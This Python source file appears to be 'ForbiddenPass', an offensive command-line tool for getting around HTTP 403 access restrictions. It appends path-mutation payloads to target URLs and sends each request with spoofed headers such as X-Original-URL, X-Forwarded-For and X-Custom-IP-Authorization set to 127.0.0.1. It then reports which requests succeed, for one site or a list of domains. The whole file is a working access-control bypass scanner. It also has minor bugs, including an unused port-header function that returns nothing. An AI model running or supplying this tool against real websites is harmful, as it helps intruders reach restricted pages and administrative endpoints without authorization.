from colorama import Fore, Back, Style
from fake_useragent import UserAgent
import concurrent.futures
import requests
import argparse
import sys
import json

banner = r"""


___________         ___.   .__    .___  .___           __________
\_   _____/_________\_ |__ |__| __| _/__| _/____   ____\______   \_____    ______ ______
 |    __)/  _ \_  __ \ __ \|  |/ __ |/ __ |/ __ \ /    \|     ___/\__  \  /  ___//  ___/
 |     \(  <_> )  | \/ \_\ \  / /_/ / /_/ \  ___/|   |  \    |     / __ \_\___ \ \___ \
 \___  / \____/|__|  |___  /__\____ \____ |\___  >___|  /____|    (____  /____  >____  >
     \/                  \/        \/    \/    \/     \/               \/     \/     \/   v1.1
by c0d3Ninja, MrPMillz

"""

print(Fore.CYAN + banner)

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

group.add_argument('-p', '--path', action='store',
                   type=str, help='path to check',
                   metavar='domain.com')

parser.add_argument('-d', '--domains', action='store',
                    help="domains to check",
                    metavar="filename.txt")

parser.add_argument('-t', '--target', action='store',
                    help="domain to check",
                    metavar="site.com")

args = parser.parse_args()

ua = UserAgent()


def word_list(wordlist: str) -> list:
    try:
        with open(wordlist, 'r') as f:
            _wordlist = [x.strip() for x in f.readlines()]
        return _wordlist
    except FileNotFoundError as fnf_err:
        print(f"FileNotFoundError: {fnf_err}")
        sys.exit(1)

wordlist = word_list("bypasses.txt")


def header_bypass(path=None):
    headers = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Original-URL': path if path else '/'},
        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
        {'User-Agent': str(ua.chrome), 'X-Originally-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'True-Client-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-WAP-Profile': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Arbitrary': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Proto': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'Destination': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Remote-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Client-IP': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-ProxyUser-Ip': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'}
    ]
    return headers

def port_based_bypass(path=None):
    headers = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '4443'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '80'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8080'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8443'}
    ]

def do_request(url: str, stream=False, path=None):
    if path:
        headers = header_bypass(path=path)
    else:
        headers = header_bypass()
    try:
        for header in headers:
            if stream:
                r = requests.get(url, stream=True, headers=header)
            else:
                r = requests.get(url, headers=header)
            if r.status_code == 200:
                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.GREEN + " [{}]".format(r.status_code))
            else:
                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.RED + " [{}]".format(r.status_code))
    except requests.exceptions.ConnectionError as ce_error:
        pass
    except requests.exceptions.Timeout as t_error:
        print("Connection Timeout Error: ", t_error)
        pass
    except requests.exceptions.RequestException as req_err:
        print("Some Ambiguous Exception:", req_err)
        pass


def main(wordlist):
    if args.domains:
        if args.path:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = word_list(args.domains)
            for lines in checklist:
                for bypass in wordlist:
                    links = lines + "/" + args.path + bypass
                    do_request(links, stream=True, path=args.path)
        else:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = word_list(args.domains)
            for lines in checklist:
                for bypass in wordlist:
                    links = lines + bypass
                    do_request(links, stream=True)
    if args.target:
        if args.path:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in wordlist:
                links = args.target + "/" + args.path + bypass
                do_request(links, path=args.path)

        else:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in wordlist:
                links = args.target + bypass
                do_request(links)

if __name__ == "__main__":
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(main, wordlist)
    except KeyboardInterrupt as err:
        sys.exit(0)
